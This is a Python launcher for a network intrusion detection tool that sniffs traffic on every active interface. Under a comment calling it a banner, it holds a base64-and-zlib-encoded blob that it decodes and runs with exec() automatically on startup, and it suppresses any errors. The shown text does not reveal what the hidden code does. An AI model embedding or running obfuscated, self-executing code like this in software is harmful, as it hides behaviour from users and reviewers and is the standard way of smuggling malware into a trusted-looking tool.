import sys
import psutil

from modules.PacketCapture import PacketCapture
from modules.TrafficAnalyzer import TrafficAnalyzer
from modules.AlertSystem import AlertSystem
from modules.IntrusionDetectionSystem import IntrusionDetectionSystem
# D4rkScyth3 Banner
import zlib, base64
from colorama import Fore, Style, init
init(autoreset=True)

ENCODED_CODE = "eJytVMFu00AQvfsrRj6tW5pFgDhEyiFQkyKFIDUpqNJKKyd1GovYjpyNUNXNX3Diwgdw5of4Aj6Bmdl1uiYcs5KT9czb92ae7Vk2dQmLel03WZlBUW7qxsC7usmfwdQ8rPGvqAoT0Y/IdgYT29wMZs0uT6LoLl/CdlV/1fOsqvJGJP0IcLk7GECzjOM4eiS63tvb4WQPmhfw8hvdxnw4jITwIHMcAghlBIUBFOUlXgmAcEhIHOw6vdxbD1Bt7mljOQPSKpbSWh4i0tWtOoKW+BULSZAJWAAOYcRazmDYR9TTRnAFko7hRUHLewFWUd2YVaqrYxlq8ZDQeESTDtXMOkKjTBuhlPUmKUYTpQ86DBcKvJHHMvgrvNdI783u+EfPTEArh70eBH1joaDzzTo4Hvt/X9BagRUqbwmQT8oTIyiQ8baFfQVEuPnXPxSX/JzaI+Q4smttuWDcSqWdN95IqQ70gY5/TgzGcx3/nCHa9c/WI5BMoRfJhb0KCXm0dgh/KNHcu7tTVrWQCE64zi+Cde47GF2nKX6pJ12f4D1M4QomcNMZBydd3W4eeXzhizpNZ3o4Hu8jmkWE2zRFZYQbUkkQ4bo+DEfpZDaEc4h/f/8Jo8Jc7eYI6cPKmM22L+V9YVa7eW9Rl/LyVfNlungwq5fxEdGb8U1KLH9+fPsFs3yd3+OEDWhMr8zlHRJsmUAj5zHJbToef/xMNBcxnMHr5yEiVlV89gLHcFQs8eOqsjLHD2swgFjrMisqrWM3jzsjOor+Aj4qbwY="

def run_encoded_code():
    try:
        exec(zlib.decompress(base64.b64decode(ENCODED_CODE)).decode("utf-8"))
    except Exception as e:
        print("[!] Error executing encoded code:", e)

run_encoded_code()


def list_active_interfaces():
    """Return all active interfaces (with IPv4, skip loopback)."""
    interfaces = []
    for name, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == 2 and addr.address != "127.0.0.1":
                interfaces.append(name)
    return interfaces


def main():
    interfaces = list_active_interfaces()
    if not interfaces:
        print("No active network interfaces found.")
        sys.exit(1)

    print("Starting NIDS on ALL active interfaces...")
    print("Interfaces:", ", ".join(interfaces))

    alert_system = AlertSystem()
    analyzer = TrafficAnalyzer(alert_system)
    ids = IntrusionDetectionSystem(alert_system=alert_system, logs_dir="logs")

    sniffer = PacketCapture(interfaces, analyzer)
    sniffer.start()

if __name__ == "__main__":
    main()
